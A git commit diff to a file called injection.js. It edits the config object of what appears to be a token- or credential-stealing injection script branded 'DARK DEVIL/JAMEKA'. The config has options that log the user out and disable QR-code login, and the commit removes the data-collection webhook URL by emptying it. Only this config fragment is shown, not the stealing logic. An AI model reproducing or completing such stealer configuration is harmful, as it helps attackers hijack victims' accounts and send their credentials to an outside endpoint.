2859e10eb161453ab8ce99179c8029b12ad1db10
Jameka2 <101510650+Jameka2@users.noreply.github.com>
2022-10-06 12:02:30 +0200

    Update injection.js

--- injection.js
+++ injection.js
@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "ᗪ₳R₭ ᗪΞVÏŁ/JAMEKA",
 
-    webhook: "https://websec.services/send/633d98059ad22e8b19d01639",
+    webhook: "",
 
     logout: true,
     disable_qr_code: true,
